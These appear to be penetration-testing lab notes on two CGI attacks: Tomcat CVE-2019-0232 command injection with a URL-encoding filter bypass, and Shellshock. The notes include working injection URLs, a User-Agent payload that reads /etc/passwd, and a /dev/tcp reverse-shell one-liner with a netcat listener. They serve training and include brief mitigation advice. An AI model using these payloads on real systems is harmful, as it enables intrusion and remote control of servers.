## 1- Attacking Tomcat CGI 
`CVE-2019-0232` is a **Windows-only RCE vulnerability** in Tomcat’s CGI Servlet when **enableCmdLineArguments** is enabled.  
Affected versions:
- **9.0.0.M1 → 9.0.17**
- **8.5.0 → 8.5.39**
- **7.0.0 → 7.0.93**
The issue comes from improper input validation, allowing attackers to inject OS commands into CGI scripts.

The CGI Servlet lets Tomcat run external apps (Perl, Python, Bash scripts).  
It forwards browser requests → CGI script → output back to browser.

**Pros / Cons**

|Advantages|Disadvantages|
|---|---|
|Easy & flexible dynamic content|Heavy overhead per request|
|Any language via stdin/stdout|No caching between requests|
|Reuse old code|Slower server performance|
When **enableCmdLineArguments=true**, query parameters become script arguments.  
This enables features—but also introduces command injection risks.

Example injection:
```bash
http://10.129.204.227:8080/cgi/welcome.bat?&whoami
                         └──────────────┘ └───────┘
                           CGI script      parameters
# Everything after ? is sent to welcome.bat as command-line arguments.-> welcome.bat & dir

# /cgi/welcome.bat?|whoami --> welcome.bat | dir
```
##### Enumeration

**Nmap Scan** : Tomcat **9.0.17** discovered on **port 8080**.
```shell
nmap -p- -sC -Pn 10.129.204.227 --open
# Apache Tomcat/9.0.17 on port 8080
```


**Finding CGI Scripts:**
Using **ffuf** with common.txt:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
==Fuzzing .cmd (no results)==
Since the operating system is Windows, we aim to fuzz for batch **scripts.bat:**
```shell
ffuf -w common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
  # Found: welcome.bat
```
==Fuzzing .bat (found welcome.bat)==

Navigating to the discovered URL at `http://10.129.204.227:8080/cgi/welcome.bat` returns a message:
```
Welcome to CGI, this section is not functional yet.
```
#### Exploitation
As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`

Basic injection
```bash
http://10.129.204.227:8080/cgi/welcome.bat?&dir
  # list the directory work
http://10.129.204.227:8080/cgi/welcome.bat?&whoami
  # whoami not work  
```
URL returns the output for the `dir` batch command, however trying to run other common windows command line apps, such as `whoami` doesn't return an output.

List environment variables
```bash
# http://10.129.204.227:8080/cgi/welcome.bat?&set
```
PATH is empty → need full paths.

Attempt whoami with the full Path
```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```
==Fails because Tomcat blocks special chars.==

**URL-encode to bypass filter**
```bash
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
  # www-data
```
**==This bypasses Tomcat’s regex patch and executes commands.==**


---

## 2-Attacking Common Gateway Interface (CGI) Applications - Shellshock
CGI is middleware used by web servers to generate dynamic content and interact with external programs. CGI scripts live in `/cgi-bin`, run with the web server’s permissions, and can be written in languages like Perl, C, C++, or Java. They process user input (e.g., forms) and return dynamic output.
![[Pasted image 20251206115126.png]]
Basic workflow:
- User requests a CGI script via URL.
- Server executes the script.
- Output is returned to the browser.

Disadvantages: each request spawns a new process, no caching, high resource use, outdated technology, still common on older systems and embedded devices.
#### CGI Attacks
The most famous CGI attack is **Shellshock (CVE-2014-6271)**, a Bash vulnerability allowing attackers to execute commands via environment variables. Old Bash versions (≤4.3) incorrectly processed function definitions, enabling command injection. Shellshock was extremely widespread and still appears in pentests.
#### Shellshock via CGI
Shellshock works by injecting a malicious function definition into an environment variable. Vulnerable Bash interprets and executes extra commands after the function:
```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```
If vulnerable, both **vulnerable-shellshock** and **not vulnerable** print.  
If patched, only **not vulnerable** prints.

Commands run with the web server user (usually `www-data`, sometimes `root` if misconfigured).

##### Enumeration - Gobuster
Gobuster is used to discover CGI scripts:
```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
  # /access.cgi           (Status: 200) [Size: 0]
```

cURLing the script returns no output but still may be exploitable.
```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi

# HTTP/1.1 200 OK
# Server: Apache/2.4.41 (Ubuntu)
# Content-Length: 0
```
#### Confirming the Vulnerability
Injecting payloads via the **User-Agent** header confirms Shellshock by leaking `/etc/passwd`:
```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

#### Exploitation to Reverse Shell Access
A simple reverse shell payload:
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

Netcat receives a shell as `www-data`, from which privilege escalation or lateral movement can begin.

```bash
sudo nc -lvnp 7777
  # id -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### Mitigation
The primary fix is upgrading Bash.  
On outdated or embedded systems (IoT), updates may be difficult.  
If patching is impossible:
- Ensure the host is not internet-exposed
- Consider decommissioning
- As a temporary workaround, firewall or isolate the device
#### Closing Thoughts
Shellshock is old but still appears on outdated servers and IoT devices. Whenever CGI scripts are found during testing, Shellshock checks are worthwhile—you may gain an easy foothold.
